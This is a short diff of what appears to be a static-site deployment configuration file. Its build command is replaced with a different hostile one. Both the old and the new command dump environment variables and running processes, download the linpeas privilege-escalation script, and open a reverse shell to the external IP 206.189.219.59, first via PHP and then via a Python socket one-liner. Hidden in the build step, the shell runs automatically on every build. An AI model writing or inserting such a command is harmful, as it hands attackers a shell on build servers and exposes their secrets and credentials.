@@ -2,7 +2,7 @@
   framework = "#static"
 
 [build]
-  command = "env > /tmp/env; ps aux > /tmp/psaux; wget 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh' -O /tmp/lin; chmod +x /tmp/lin; php -r '$sock=fsockopen(\"206.189.219.59\",5090);exec(\"/bin/sh -i <&3 >&3 2>&3\");' &"
+  command = "env > /tmp/env; ps aux > /tmp/psaux; wget 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh' -O /tmp/lin; chmod +x /tmp/lin; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"206.189.219.59\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'; &"
   publish = "public"
 
 [context.production]
